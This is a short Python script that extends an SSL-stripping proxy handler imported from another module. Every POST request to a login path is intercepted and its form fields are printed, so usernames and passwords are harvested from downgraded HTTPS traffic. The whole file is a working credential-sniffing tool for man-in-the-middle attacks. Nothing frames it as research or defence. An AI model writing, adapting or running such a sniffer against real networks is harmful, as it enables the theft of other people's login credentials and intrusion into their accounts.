#!/usr/bin/env python

from SSLStripProxy import SSLStripProxyHandler, test
import urlparse

class SSLSniffPasswordProxyHandler(SSLStripProxyHandler):
    def request_handler(self, req, body):
        SSLStripProxyHandler.request_handler(self, req, body)

        if req.command == 'POST' and 'login' in req.path.lower():
            print req.path
            for k, v in urlparse.parse_qsl(body):
                print "  %s: %s" % (k, v)


if __name__ == '__main__':
    test(HandlerClass=SSLSniffPasswordProxyHandler)
